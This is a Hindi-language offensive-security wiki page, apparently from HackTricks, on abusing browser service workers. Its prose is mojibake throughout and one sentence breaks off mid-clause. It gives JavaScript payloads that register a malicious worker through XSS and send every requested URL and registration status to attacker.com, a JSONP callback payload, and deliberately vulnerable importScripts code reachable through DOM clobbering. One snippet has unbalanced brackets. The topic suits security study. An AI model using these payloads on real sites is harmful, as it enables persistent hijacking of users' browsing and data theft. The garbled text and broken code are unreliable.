# рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдорд╛рдпрдиреЗ рд░рдЦрддреА рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рд╣рдорд▓рд╛ рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрдордХреА рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рдЯреЗрдХ рд╕реНрдЯреИрдХ, рдПрдкреАрдЖрдИ рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ, рдореБрджреНрджреЛрдВ рдХреЛ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЗрд╕реЗ рдореБрдлреНрдд рдореЗрдВ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) рдЖрдЬред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рдПрдХ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рд╣реИ рдЬрд┐рд╕реЗ рдЖрдкрдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ **рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдореЗрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ**, рд╡реЗрдм рдкреЗрдЬ рд╕реЗ рдЕрд▓рдЧ, рдЬреЛ рд╡реЗрдм рдкреЗрдЬ рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрд╡рд╛рдж рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдиреЗ рдкрд░ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рджрд░рд╡рд╛рдЬреЗ рдЦреЛрд▓рддрд╛ рд╣реИред ([рдпрд╣рд╛рдВ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рдХреНрдпрд╛ рд╣реИ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА](https://developers.google.com/web/fundamentals/primers/service-workers)).\
рдлрд┐рд░ рдЖрдк рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдЖрдк **рдкреАрдбрд╝рд┐рдд рд╕рддреНрд░** рдореЗрдВ **рдЙрдиреНрд╣реЗрдВ рдмрдирд╛рддреЗ / рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ** рдЬреЛ **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓** рд╡реЗрдм **рдбреЛрдореЗрди** рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ **рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ **рд╕рднреА рдкреГрд╖реНрдареЛрдВ** рдкрд░ рдЬреЛ **рдкреАрдбрд╝рд┐рдд** рд▓реЛрдб рдХрд░реЗрдЧрд╛ **рдЙрд╕ рдбреЛрдореЗрди** рдореЗрдВред

### рдореМрдЬреВрджрд╛ SWs рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рдЖрдк рдЙрдиреНрд╣реЗрдВ **рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕** рдХреЗ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдЯреИрдм рдореЗрдВ **рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░реНрд╕** рдлрд╝реАрд▓реНрдб рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣рд╛рдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals).

### рдкреБрд╢ рд╕реВрдЪрдирд╛рдПрдВ

рдпрджрд┐ рдкреАрдбрд╝рд┐рдд рдиреЗ **рдкреБрд╢ рд╕реВрдЪрдирд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдирд╣реАрдВ рджреА рд╣реИрдВ рддреЛ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ **рд╕рд░реНрд╡рд░ рд╕реЗ рд╕рдВрдЪрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд┐рд░ рд╕реЗ рд╣рдорд▓рд╛рд╡рд╛рд░ рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рд╕реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рднреА рдкреГрд╖реНрдареЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреА рд░реЛрдХ рд╣реЛрдЧреА рдЬреЛ рд╣рдорд▓рд╛рд╡рд╛рд░ рд╡реЗрдм рдкреГрд╖реНрда рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗрдм рдПрдХ рджреБрд░реБрдкрдпреЛрдЧ рдпрджрд┐ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдкреАрдбрд╝рд┐рдд **рдкреБрд╢ рд╕реВрдЪрдирд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдПрдХ рдЬреЛрдЦрд┐рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред

## рд╣рдорд▓рд╛ рдПрдХ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рдмрдирд╛рдирд╛

рдЗрд╕ рд╕рдВрдХрдЯ рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреА рдЦреЛрдЬ рдХрд░рдиреА рд╣реЛрдЧреА:

* **рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдирд┐рдпрдорд┐рдд JS рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ** рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдФрд░ рдПрдХ **XSS рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рд▓реЛрдб рдХрд░рдиреЗ** рдХрд╛
* рдПрдХ **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ JSONP рдЕрдиреБрд░реЛрдз** рдЬрд╣рд╛рдВ рдЖрдк **рдЖрдЙрдЯрдкреБрдЯ рдХреЛ (рдЕрдирд┐рдпрдорд┐рдд JS рдХреЛрдб рдХреЗ рд╕рд╛рде) рдорд╛рдирд┐рдкреБрд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдПрдХ **XSS** рдЬрд┐рд╕рд╕реЗ рдЖрдк **рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде JSONP рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рдПрдХ рдЦрддрд░рдирд╛рдХ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рд▓реЛрдб рдХрд░реЗрдЧрд╛**ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдореИрдВ рдПрдХ рдХреЛрдб рдкреНрд░рд╕реНрддреБрдд рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБ рдЬреЛ рдПрдХ рдирдпрд╛ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рдХреЛ **рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░реЗрдЧрд╛** рдЬреЛ `fetch` рдШрдЯрдирд╛ рдХреЛ рд╕реБрдиреЗрдЧрд╛ рдФрд░ **рд╣рдорд▓рд╛рд╡рд╛рд░ рд╕рд░реНрд╡рд░ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд▓рд┐рдП URL рд▓рд╛рдПрдЧрд╛** (рдпрд╣ рдХреЛ
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
рдФрд░ рдпрд╣ рд╣реИ рдХреЛрдб рдЬреЛ **рд╡рд░реНрдХрд░ рдХреЛ рдкрдВрдЬреАрдХреГрдд** рдХрд░реЗрдЧрд╛ (рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рдПрдХ **XSS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдПрдХ **GET** рдЕрдиреБрд░реЛрдз **рд╣рдорд▓рд╛рд╡рд░реЛрдВ** рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рд╕реВрдЪрд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рд╕реЗрд╡рд╛ рд╡рд░реНрдХрд░ рдХрд╛ рдкрдВрдЬреАрдХрд░рдг рд╕рдлрд▓ рд░рд╣рд╛ рдпрд╛ рдирд╣реАрдВ:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
рдПрдХ рдЕрд╡рд░реЛрдзрд┐рдд JSONP рдЕрдВрдд-рдмрд┐рдВрджреБ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдкрдХреЛ рдорд╛рди рдХреЛ `var sw` рдХреЗ рднреАрддрд░ рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
рдПрдХ **C2** рд╣реИ рдЬреЛ **рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░реНрд╕ рдХреЗ рдЙрддреНрдкрд╛рджрди** рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдирд╛рдо рд╣реИ [**Shadow Workers**](https://shadow-workers.github.io) рдЬреЛ рдЗрди рд╕рдВрдХрдЯреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред

рдПрдХ XSS рд╕реНрдерд┐рддрд┐ рдореЗрдВ, 24 рдШрдВрдЯреЗ рдХреЗ рдХреИрд╢ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реАрдорд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдПрдХ рджреБрд╖реНрдЯ рдпрд╛ рд╕рдВрдХреНрд░рдорд┐рдд SW рдПрдХреНрд╕рдПрд╕рдПрд╕ рд╕рдВрдХрдЯ рдХреЗ рдПрдХ рдареАрдХ рдХреЗ рдмрд╛рдж рднреА рдЕрдзрд┐рдХрддрдо 24 рдШрдВрдЯреЗ рддрдХ рдмрдиреА рд░рд╣реЗрдЧреА (рдпрджрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдСрдирд▓рд╛рдЗрди рд╣реИ)ред рд╕рд╛рдЗрдЯ рдСрдкрд░реЗрдЯрд░ рд╕реНрд╡ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрд░ рдХрдо рд╕рдордп рдЬреАрд╡рди рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдХреЗ рд╕рдВрдХрдЯ рдХреА рдЦрд┐рдбрд╝рдХреА рдХреЛ рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рднреА рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд░рддреЗ рд╣реИрдВ [рдПрдХ рдХрд┐рд▓-рд╕реНрд╡рд┐рдЪ рдПрд╕рдбрдмреНрд▓реНрдпреВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)ред

## DOM Clobbering рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SW рдореЗрдВ `importScripts` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рд╕реЗ рдмреБрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди **`importScripts`** рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ **рдПрдХ рдЕрд▓рдЧ рдбреЛрдореЗрди рд╕реЗ рдЖрдпрд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ **рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рддреЛ рд╡рд╣ рдЕрдкрдиреЗ рдбреЛрдореЗрди рд╕реЗ рдПрдХ JS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЖрдпрд╛рдд рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ XSS рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдЧрд╛ред

**рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрд╣ CSP рд╕рдВрд░рдХреНрд╖рдг рдХреЛ рднреА рджреМрд░ рдХрд░рддрд╛ рд╣реИред**

**рдЙрджрд╛рд╣рд░рдг рд░реВрдкреА рд╕рдВрдХрдЯрдкреВрд░реНрдг рдХреЛрдб:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering рдХреЗ рд╕рд╛рде

DOM Clobbering рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

рдпрджрд┐ SW рдЙрд╕ URL/domain рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕реЗ **`importScripts`** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдФрд░ рд╡рд╣ **HTML element рдХреЗ рдЕрдВрджрд░ рд╣реИ**, рддреЛ **DOM Clobbering рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ SW рдЖрдкрдХреЗ рдЦреБрдж рдХреЗ domain рд╕реЗ script рд▓реЛрдб рдХрд░реЗрдВред

рдЗрд╕рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕рдВрджрд░реНрдн рд▓рд┐рдВрдХ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреЗ рд╣рдорд▓реЗ рдХреЗ рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рдгрд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рдЯреЗрдХ рд╕реНрдЯреИрдХ, API рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ, рдореЗрдВ рд╕рдорд╕реНрдпрд╛рдПрдВ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЗрд╕реЗ рдЖрдЬрдорд╛рдПрдВ рдореБрдлреНрдд рдореЗрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ**? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
